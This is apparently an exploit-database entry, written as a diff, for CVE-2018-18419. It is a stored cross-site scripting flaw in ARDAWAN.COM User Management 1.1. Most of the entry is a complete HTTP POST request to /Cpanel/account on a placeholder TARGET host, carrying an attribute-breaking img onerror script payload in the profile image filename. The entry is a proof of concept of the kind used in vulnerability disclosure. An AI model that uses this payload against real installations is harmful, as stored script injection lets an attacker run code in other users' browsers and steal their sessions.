@@ -1,0 +1,36 @@
+# Exploit Title: User Management 1.1 - Cross-Site Scripting
+# Date: 2018-10-16
+# Exploit Author: Ismail Tasdelen
+# Vendor Homepage: http://ardawan.com/
+# Software Link : http://um.ardawan.com
+# Software : User Management
+# Version : 1.1
+# Vulernability Type : Cross-site Scripting
+# Vulenrability : Stored XSS
+# CVE : CVE-2018-18419
+
+# Stored XSS has been discovered in the upload section of ARDAWAN.COM User Management 1.1,
+#  as demonstrated by a .jpg filename to the /account URI.
+ 
+# HTTP POST Request :
+
+POST /Cpanel/account HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://TARGET/Cpanel/account
+Content-Type: multipart/form-data; boundary=---------------------------7088451293981732581393631504
+Content-Length: 1574638
+Cookie: ci_session=cmq2fvkbgc133i8amc4sadmpl216iplt; UM_sessID=ovno91tjrd0qo8dc5d2il0teronrn9k1; _ga=GA1.2.1869398047.1539664507; _gid=GA1.2.268810780.1539664507
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+-----------------------------7088451293981732581393631504
+Content-Disposition: form-data; name="fullName"
+
+Admin
+-----------------------------7088451293981732581393631504
+Content-Disposition: form-data; name="profileImage"; filename="\"><img src=x onerror=alert(\"ismailtasdelen\")>.jpg"
+Content-Type: image/jpeg
